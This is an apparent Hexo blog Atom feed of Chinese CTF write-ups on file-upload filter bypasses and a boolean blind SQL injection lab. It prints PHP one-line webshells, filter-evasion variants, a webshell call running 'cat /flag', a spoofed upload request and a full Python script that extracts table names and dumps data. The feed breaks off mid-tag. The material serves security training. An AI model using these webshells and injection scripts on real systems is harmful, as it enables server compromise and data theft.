<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>S-H-BF</title>
  
  <subtitle>Sonder39的博客</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2024-10-23T01:25:17.155Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>Sonder39</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>危险函数绕过上传</title>
    <link href="http://example.com/2024/03/05/%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87%E4%B8%8A%E4%BC%A0/"/>
    <id>http://example.com/2024/03/05/%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87%E4%B8%8A%E4%BC%A0/</id>
    <published>2024-03-05T10:13:27.000Z</published>
    <updated>2024-10-23T01:25:17.155Z</updated>
    
    <content type="html"><![CDATA[<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>网页有上传文件的入口，先尝试上传一个一句话木马</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cssec&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>网页提示</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">服务器检测到文件包含危险内容，启动了查杀程序。</span><br></pre></td></tr></table></figure><p>对危险内容的检验，修改一句话木马为</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$_POST</span>[<span class="string">&#x27;cssec&#x27;</span>]; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这样可以成功绕过，说明是对可以命令执行的危险函数的过滤，改为</p><figure class="highlight handlebars"><table><tr><td class="code"><pre><span class="line"><span class="language-xml"><span class="meta">&lt;?php $_GET[&#x27;func&#x27;]($_GET[&#x27;args&#x27;]); ?&gt;</span></span></span><br></pre></td></tr></table></figure><p>连接木马</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://ctf.seek2.top:32853/uploads/exp1.php?func=system&amp;args=cat%20/flag</span><br></pre></td></tr></table></figure><p>得到flag，也可以尝试其它免杀方式，包括使用反序列化知识，chr()，字符串拼接等等</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;思路&quot;&gt;&lt;a href=&quot;#思路&quot; class=&quot;headerlink&quot; title=&quot;思路&quot;&gt;&lt;/a&gt;思路&lt;/h1&gt;&lt;p&gt;网页有上传文件的入口，先尝试上传一个一句话木马&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;</summary>
      
    
    
    
    <category term="文件上传" scheme="http://example.com/categories/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
    
    <category term="危险函数绕过" scheme="http://example.com/tags/%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87/"/>
    
  </entry>
  
  <entry>
    <title>PHP标签绕过上传</title>
    <link href="http://example.com/2024/03/05/PHP%E6%A0%87%E7%AD%BE%E7%BB%95%E8%BF%87%E4%B8%8A%E4%BC%A0/"/>
    <id>http://example.com/2024/03/05/PHP%E6%A0%87%E7%AD%BE%E7%BB%95%E8%BF%87%E4%B8%8A%E4%BC%A0/</id>
    <published>2024-03-05T10:13:26.000Z</published>
    <updated>2024-04-18T02:40:06.072Z</updated>
    
    <content type="html"><![CDATA[<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>网页有上传文件的入口，先尝试上传一个一句话木马</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cssec&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>网页提示</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">服务器检测到&lt;?php，启动了查杀程序。</span><br></pre></td></tr></table></figure><p>对php 标签的检验，修改一句话木马为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;? eval($_POST[&#x27;cssec&#x27;]); ?&gt;</span><br></pre></td></tr></table></figure><p>使用一种php短标签，可以绕过</p><figure class="highlight handlebars"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">文件 exp.php 已经上传。</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">文件路径: uploads/exp.php</span></span><br></pre></td></tr></table></figure><p>连接木马，得到flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;思路&quot;&gt;&lt;a href=&quot;#思路&quot; class=&quot;headerlink&quot; title=&quot;思路&quot;&gt;&lt;/a&gt;思路&lt;/h1&gt;&lt;p&gt;网页有上传文件的入口，先尝试上传一个一句话木马&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;</summary>
      
    
    
    
    <category term="文件上传" scheme="http://example.com/categories/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
    
    <category term="PHP标签绕过" scheme="http://example.com/tags/PHP%E6%A0%87%E7%AD%BE%E7%BB%95%E8%BF%87/"/>
    
  </entry>
  
  <entry>
    <title>文件头绕过上传</title>
    <link href="http://example.com/2024/03/05/%E6%96%87%E4%BB%B6%E5%A4%B4%E7%BB%95%E8%BF%87%E4%B8%8A%E4%BC%A0/"/>
    <id>http://example.com/2024/03/05/%E6%96%87%E4%BB%B6%E5%A4%B4%E7%BB%95%E8%BF%87%E4%B8%8A%E4%BC%A0/</id>
    <published>2024-03-05T10:13:25.000Z</published>
    <updated>2024-10-23T01:25:15.759Z</updated>
    
    <content type="html"><![CDATA[<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>网页有上传文件的入口，先尝试上传一个一句话木马</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cssec&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>网页提示</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">服务器检测到&lt;?php，启动了查杀程序。</span><br></pre></td></tr></table></figure><p>可能是对文件头或者文件内容的检验，修改一句话木马为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;?php eval($_POST[&#x27;cssec&#x27;]); ?&gt;</span><br></pre></td></tr></table></figure><p>添加gif的文件头，不会影响php的解析</p><figure class="highlight handlebars"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">文件 exp.php 已经上传。</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">文件路径: uploads/exp.php</span></span><br></pre></td></tr></table></figure><p>连接木马，得到flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;思路&quot;&gt;&lt;a href=&quot;#思路&quot; class=&quot;headerlink&quot; title=&quot;思路&quot;&gt;&lt;/a&gt;思路&lt;/h1&gt;&lt;p&gt;网页有上传文件的入口，先尝试上传一个一句话木马&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;</summary>
      
    
    
    
    <category term="文件上传" scheme="http://example.com/categories/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
    
    <category term="文件头绕过" scheme="http://example.com/tags/%E6%96%87%E4%BB%B6%E5%A4%B4%E7%BB%95%E8%BF%87/"/>
    
  </entry>
  
  <entry>
    <title>双写绕过上传</title>
    <link href="http://example.com/2024/03/05/%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87%E4%B8%8A%E4%BC%A0/"/>
    <id>http://example.com/2024/03/05/%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87%E4%B8%8A%E4%BC%A0/</id>
    <published>2024-03-05T10:13:24.000Z</published>
    <updated>2024-10-23T01:25:12.979Z</updated>
    
    <content type="html"><![CDATA[<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>网页有上传文件的入口，先尝试上传一个一句话木马</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cssec&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>网页提示</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">文件 exp.php 已经上传。</span><br><span class="line"></span><br><span class="line">文件路径: uploads/exp.</span><br></pre></td></tr></table></figure><p>php后缀名被替换为空了，尝试双写绕过，改为exp.phphpp 上传</p><figure class="highlight handlebars"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">文件 exp.phphpp 已经上传。</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">文件路径: uploads/exp.hpp</span></span><br></pre></td></tr></table></figure><p>连接木马，得到flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;思路&quot;&gt;&lt;a href=&quot;#思路&quot; class=&quot;headerlink&quot; title=&quot;思路&quot;&gt;&lt;/a&gt;思路&lt;/h1&gt;&lt;p&gt;网页有上传文件的入口，先尝试上传一个一句话木马&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;</summary>
      
    
    
    
    <category term="文件上传" scheme="http://example.com/categories/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
    
    <category term="双写绕过" scheme="http://example.com/tags/%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87/"/>
    
  </entry>
  
  <entry>
    <title>MIME绕过上传</title>
    <link href="http://example.com/2024/03/05/MIME%E7%BB%95%E8%BF%87%E4%B8%8A%E4%BC%A0/"/>
    <id>http://example.com/2024/03/05/MIME%E7%BB%95%E8%BF%87%E4%B8%8A%E4%BC%A0/</id>
    <published>2024-03-05T10:13:23.000Z</published>
    <updated>2024-10-23T01:34:10.235Z</updated>
    
    <content type="html"><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>文件上传是许多网站的一种常见功能，但如果没有正确处理，可能会被利用来上传恶意文件，如webshell。</p><p>一句话木马是一种常见的webshell，通常只有一行代码，但可以在服务器上执行任意命令。例如：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cssec&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这段代码会执行通过POST请求发送的任意PHP代码，只要提供正确的密码。就可以利用这个webshell来控制服务器，例如执行系统命令。</p><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>网页有上传文件的入口，先尝试上传一个一句话木马</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cssec&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>网页提示</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">只允许上传：image/jpeg，image/png类型和markdown文件；</span><br></pre></td></tr></table></figure><p>说明通过HTTP的标头在判断，拦截流量</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/module/upload.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>ctf.seek2.top:32841</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>234</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://ctf.seek2.top:32841</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryhbPHUINZzWuGpW5E</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.121 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://ctf.seek2.top:32841/module/upload.php</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>sign=5a18d02b1f8da8d5f70a4cba720dfafd</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryhbPHUINZzWuGpW5E</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;fileUpload&quot;</span>; filename=<span class="string">&quot;exp.php&quot;</span></span></span><br><span class="line"><span class="language-php">Content-Type: application/octet-stream</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cssec&#x27;</span>]); <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryhbPHUINZzWuGpW5E--</span></span><br><span class="line"><span class="language-php"></span></span><br></pre></td></tr></table></figure><p>Content-Type: application&#x2F;octet-stream类型不允许上传，改为允许的image&#x2F;png，不会影响文件本身，只是欺骗服务器，就把shell 上传上去了，</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">文件 exp.php 已经上传。</span><br><span class="line"></span><br><span class="line">文件路径: uploads/exp.php</span><br></pre></td></tr></table></figure><p>连接木马，得到flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h1&gt;&lt;p&gt;文件上传是许多网站的一种常见功能，但如果没有正确处理，可能会被利用来上传恶意文件，如webshell。&lt;/p&gt;
&lt;p&gt;一句话木马是一种常见的</summary>
      
    
    
    
    <category term="文件上传" scheme="http://example.com/categories/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
    
    <category term="MIME绕过" scheme="http://example.com/tags/MIME%E7%BB%95%E8%BF%87/"/>
    
  </entry>
  
  <entry>
    <title>布尔盲注实验</title>
    <link href="http://example.com/2024/03/05/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E5%AE%9E%E9%AA%8C/"/>
    <id>http://example.com/2024/03/05/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E5%AE%9E%E9%AA%8C/</id>
    <published>2024-03-05T10:13:22.000Z</published>
    <updated>2024-03-06T10:07:24.053Z</updated>
    
    <content type="html"><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>布尔盲注通过观察应用程序的响应来推断SQL查询的结果。在布尔盲注中，发送特定的SQL语句，这些语句的结果是一个布尔值（真或假）。然后，根据应用程序的响应来推断这个布尔值。</p><p>例如，可以 发送如下的SQL语句：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; AND substring(database(),1,1)=&#x27;</span>a</span><br></pre></td></tr></table></figure><p>如果应用程序的响应与正常的响应不同，那么就可以推断出数据库的名称的第一个字符不是’a’。</p><p>使用Python进行布尔盲注的演示脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://ctf.seek2.top/page.php?id=1&quot;</span></span><br><span class="line">charset = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> charset:</span><br><span class="line">        payload = <span class="string">f&quot;&#x27; AND substring(database(),<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;char&#125;</span>&quot;</span></span><br><span class="line">        full_url = <span class="string">f&quot;<span class="subst">&#123;url&#125;</span><span class="subst">&#123;payload&#125;</span>&quot;</span></span><br><span class="line">        response = requests.get(full_url)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;expected output&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            result += char</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;database name: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>这个脚本首先定义了一个字符集，然后逐个尝试这些字符。对于每个字符，脚本都会构造一个payload，然后发送一个请求到目标URL。如果响应中包含预期的输出，那么脚本就会将这个字符添加到结果中。</p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">target = <span class="string">&#x27;http://ctf.seek2.top:32838&#x27;</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">BlindList = string.ascii_lowercase + string.digits + string.punctuation + <span class="string">&#x27; &#x27;</span> + string.ascii_uppercase</span><br><span class="line">url = <span class="string">f&#x27;<span class="subst">&#123;target&#125;</span>/result.php&#x27;</span></span><br><span class="line">ValueTrue = <span class="string">&#x27;查询成功&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rq_get</span>(<span class="params">payload</span>):</span><br><span class="line">    param = &#123;<span class="string">&#x27;id&#x27;</span>: payload&#125;</span><br><span class="line">    res = requests.get(url, params=param, headers=headers)  <span class="comment"># get请求</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_match</span>(<span class="params">payload</span>):</span><br><span class="line">    <span class="keyword">return</span> rq_get(payload).text.find(ValueTrue) != -<span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">database</span>():</span><br><span class="line">    maxlength = <span class="number">10</span></span><br><span class="line">    minlength = <span class="number">1</span></span><br><span class="line">    length = <span class="number">0</span></span><br><span class="line">    db = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    payload0 = <span class="string">f&quot;221101 and length(database())&gt;<span class="subst">&#123;maxlength&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">if</span> is_match(payload0):  <span class="comment"># 异常处理</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;length &gt; maxlength&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>  <span class="comment"># 程序直接结束</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(minlength, maxlength + <span class="number">1</span>):</span><br><span class="line">            payload1 = <span class="string">f&quot;221101 and length(database())=<span class="subst">&#123;i&#125;</span>&quot;</span></span><br><span class="line">            <span class="keyword">if</span> is_match(payload1):</span><br><span class="line">                length = i</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Current database length: <span class="subst">&#123;length&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> BlindList:</span><br><span class="line">            payload2 = <span class="string">f&quot;221101 and substring(database(),<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;k&#125;</span>&#x27;&quot;</span></span><br><span class="line">            <span class="keyword">if</span> is_match(payload2):</span><br><span class="line">                db += k</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Current database: <span class="subst">&#123;db&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tables</span>():</span><br><span class="line">    maxlength = <span class="number">200</span></span><br><span class="line">    minlength = <span class="number">1</span></span><br><span class="line">    length = <span class="number">0</span></span><br><span class="line">    tb = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    payload0 = <span class="string">f&quot;221101 and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))&gt;<span class="subst">&#123;maxlength&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">if</span> is_match(payload0):  <span class="comment"># 异常处理</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;tables length &gt; maxlength&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>  <span class="comment"># 程序直接结束</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(minlength, maxlength + <span class="number">1</span>):</span><br><span class="line">            payload1 = <span class="string">f&quot;221101 and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))=<span class="subst">&#123;i&#125;</span>&quot;</span></span><br><span class="line">            <span class="keyword">if</span> is_match(payload1):</span><br><span class="line">                length = i</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="comment"># print(f&quot;tables length: &#123;length&#125;&quot;)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> BlindList:</span><br><span class="line">            payload2 = <span class="string">f&quot;221101 and substring((select group_concat(table_name) from information_schema.tables where table_schema=database()),<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;k&#125;</span>&#x27;&quot;</span></span><br><span class="line">            <span class="keyword">if</span> is_match(payload2):</span><br><span class="line">                tb += k</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="comment"># print(f&quot;tables: &#123;tb&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">return</span> tb.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">columns</span>(<span class="params">tb</span>):</span><br><span class="line">    maxlength = <span class="number">200</span></span><br><span class="line">    minlength = <span class="number">1</span></span><br><span class="line">    length = <span class="number">0</span></span><br><span class="line">    cl = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    payload0 = <span class="string">f&quot;221101 and length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;<span class="subst">&#123;tb&#125;</span>&#x27;))&gt;<span class="subst">&#123;maxlength&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">if</span> is_match(payload0):  <span class="comment"># 异常处理</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;columns length &gt; maxlength&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>  <span class="comment"># 程序直接结束</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(minlength, maxlength + <span class="number">1</span>):</span><br><span class="line">            payload1 = <span class="string">f&quot;221101 and length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;<span class="subst">&#123;tb&#125;</span>&#x27;))=<span class="subst">&#123;i&#125;</span>&quot;</span></span><br><span class="line">            <span class="keyword">if</span> is_match(payload1):</span><br><span class="line">                length = i</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="comment"># print(f&quot;&#123;tb&#125; columns length: &#123;length&#125;&quot;)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> BlindList:</span><br><span class="line">            payload2 = <span class="string">f&quot;221101 and substring((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;<span class="subst">&#123;tb&#125;</span>&#x27;),<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;k&#125;</span>&#x27;&quot;</span></span><br><span class="line">            <span class="keyword">if</span> is_match(payload2):</span><br><span class="line">                cl += k</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;tb&#125;</span> columns: <span class="subst">&#123;cl&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> cl</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">tb, cls</span>):</span><br><span class="line">    maxlength = <span class="number">1000</span></span><br><span class="line">    minlength = <span class="number">1</span></span><br><span class="line">    length = <span class="number">0</span></span><br><span class="line">    data = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    tmp_cls = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    cls = cls.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> cl <span class="keyword">in</span> cls:</span><br><span class="line">        <span class="keyword">if</span> cl != cls[<span class="built_in">len</span>(cls) - <span class="number">1</span>]:</span><br><span class="line">            tmp_cls += <span class="string">f&quot;IFNULL(<span class="subst">&#123;cl&#125;</span>, &#x27;&#x27;),0x7c,&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tmp_cls += <span class="string">f&quot;IFNULL(<span class="subst">&#123;cl&#125;</span>, &#x27;&#x27;)&quot;</span></span><br><span class="line">    <span class="comment"># 直接使用group_concat(id,name,advantage,about,constellation)，如果某条数据中包含null,例如name为null,即使其它字段不为null,这条数据也会被抛弃，所以直接使用对含有null值的数据不友好，0x7c，等价于&#x27;|&#x27;，则是为了增加可辨识性，虽然会有点难看</span></span><br><span class="line">    <span class="comment"># IFNULL函数会检查第一个参数是否为 NULL，如果是，则返回第二个参数的值，否则返回第一个参数的值。将 NULL值替换为想要的默认值，比如空字符串 &#x27;&#x27;。任何字段为 `NULL`，它们就会被替换为空字符串，而不会影响到 group_concat() 的结果。</span></span><br><span class="line"></span><br><span class="line">    payload0 = <span class="string">f&quot;221101 and length((select group_concat(<span class="subst">&#123;tmp_cls&#125;</span>) from <span class="subst">&#123;tb&#125;</span>))&gt;<span class="subst">&#123;maxlength&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">if</span> is_match(payload0):  <span class="comment"># 异常处理</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;data length &gt; maxlength&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>  <span class="comment"># 程序直接结束</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(minlength, maxlength + <span class="number">1</span>):</span><br><span class="line">            payload1 = <span class="string">f&quot;221101 and length((select group_concat(<span class="subst">&#123;tmp_cls&#125;</span>) from <span class="subst">&#123;tb&#125;</span>))=<span class="subst">&#123;i&#125;</span>&quot;</span></span><br><span class="line">            <span class="keyword">if</span> is_match(payload1):</span><br><span class="line">                length += i</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="comment"># print(f&quot;&#123;tb&#125; data length: &#123;length&#125;&quot;)</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> BlindList:</span><br><span class="line">                payload2 = <span class="string">f&quot;221101 and substring((select group_concat(<span class="subst">&#123;tmp_cls&#125;</span>) from <span class="subst">&#123;tb&#125;</span>),<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;k&#125;</span>&#x27;&quot;</span></span><br><span class="line">                <span class="keyword">if</span> is_match(payload2):</span><br><span class="line">                    data += k</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="comment"># print(f&quot;&#123;tb&#125; data: &#123;data&#125;&quot;)</span></span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line"></span><br><span 